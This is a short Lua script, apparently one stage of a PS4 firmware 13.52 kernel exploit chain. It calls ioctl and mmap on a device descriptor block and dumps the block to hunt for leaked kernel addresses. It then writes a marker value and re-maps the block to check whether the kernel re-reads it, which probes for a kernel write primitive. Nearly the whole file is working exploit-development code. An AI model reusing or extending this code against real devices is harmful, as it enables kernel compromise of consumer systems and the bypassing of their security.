-- PS4 FW 13.52 - DESCRIPTOR PERSISTENCE + FULL DUMP (r9x) — ONE GAME-LIFE, SAFE
-- Q1: full dump of descriptor block (0x400) — hunt for more kernel VAs.
-- Q2: do our writes to the descriptor block persist after ioctl re-arm + re-mmap?

local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end
local function rq(a) return t(mem.read_qword(a)) end

print("=== R9X START ===")
pcall(function()
  local buf = mem.alloc(0x200)
  local function rearm()
    mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
    mem.write_qword(buf, 0x2ec48000)
    mem.write_qword(buf + 8, 0x100000)
    return t(S.ioctl(5, 0x80108002, buf))
  end

  local m = t(S.mmap(0x2ec48000, 0x100000, 3, 0x0001, 5, 0))
  print("--- descriptor block full dump (0x00-0x400) ---")
  for row = 0, 0x3f, 4 do
    local s = string.format("  +0x%03x:", row * 8)
    for i = 0, 3 do s = s .. string.format(" 0x%016x", rq(m + (row + i) * 8)) end
    print(s)
  end

  print("--- write persistence across re-arm ---")
  local target = m + 0x20
  mem.write_qword(target, 0xABCD0000)
  local r = rearm()
  local m2 = t(S.mmap(0x2ec48000, 0x100000, 3, 0x0001, 5, 0))
  local v = rq(m2 + 0x20)
  print(string.format("  wrote 0xABCD0000 at +0x20, re-arm=%d, read back=0x%016x %s",
    r, v, (math.floor(v / 0x10000) == 0xABCD) and "PERSIST (kernel re-reads)" or "RESET"))
end)
print("=== R9X DONE ===")
